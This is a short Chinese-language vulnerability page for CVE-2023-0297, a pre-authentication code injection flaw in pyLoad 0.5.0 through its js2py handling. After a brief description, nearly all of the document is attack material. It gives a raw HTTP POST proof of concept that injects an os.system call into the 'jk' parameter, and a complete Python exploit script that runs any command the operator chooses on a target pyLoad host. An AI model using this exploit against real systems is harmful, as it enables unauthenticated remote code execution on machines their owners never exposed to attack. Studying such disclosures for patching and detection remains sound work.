
## pyLoad远程代码执行漏洞
pyLoad是一个用 Python 编写的免费和开源下载管理器，可用于NAS、下一代路由器、无头家庭服务器以及任何能够连接到互联网并支持 Python 编程语言的设备。

pyLoad 存在代码注入漏洞，未经身份验证的攻击者可以通过滥用 js2py 功能执行任意 Python 代码。

## poc
```
POST flash/addcrypted2 HTTP/1.1
Host:127.0.0.1
Content-type: application/x-www-form-urlencoded

jk=pyimport%20os;os.system("id");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa

```

## exp脚本
```python

# Exploit Title: PyLoad 0.5.0 - Pre-auth Remote Code Execution (RCE)
# Date: 06-10-2023
# Credits: bAu @bauh0lz 
# Exploit Author: Gabriel Lima (0xGabe)
# Vendor Homepage: https://pyload.net/
# Software Link: https://github.com/pyload/pyload
# Version: 0.5.0
# Tested on: Ubuntu 20.04.6
# CVE: CVE-2023-0297

import requests, argparse

parser = argparse.ArgumentParser()
parser.add_argument('-u', action='store', dest='url', required=True, help='Target url.')
parser.add_argument('-c', action='store', dest='cmd', required=True, help='Command to execute.')
arguments = parser.parse_args()

def doRequest(url):
    try:
        res = requests.get(url + '/flash/addcrypted2')
        if res.status_code == 200:
            return True
        else:
            return False

    except requests.exceptions.RequestException as e:
        print("[!] Maybe the host is offline :", e)
        exit()

def runExploit(url, cmd):
    endpoint = url + '/flash/addcrypted2'
    if " " in cmd:
        validCommand = cmd.replace(" ", "%20")
    else:
        validCommand = cmd

    payload = 'jk=pyimport%20os;os.system("'+validCommand+'");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa'
    test = requests.post(endpoint, headers={'Content-type': 'application/x-www-form-urlencoded'},data=payload)
    print('[+] The exploit has be executeded in target machine. ')

def main(targetUrl, Command):
    print('[+] Check if target host is alive: ' + targetUrl)
    alive = doRequest(targetUrl)
    if alive == True:
        print("[+] Host up, let's exploit! ")
        runExploit(targetUrl,Command)
    else:
        print('[-] Host down! ')

if(arguments.url != None and arguments.cmd != None):
    targetUrl = arguments.url
    Command = arguments.cmd
    main(targetUrl, Command)
```
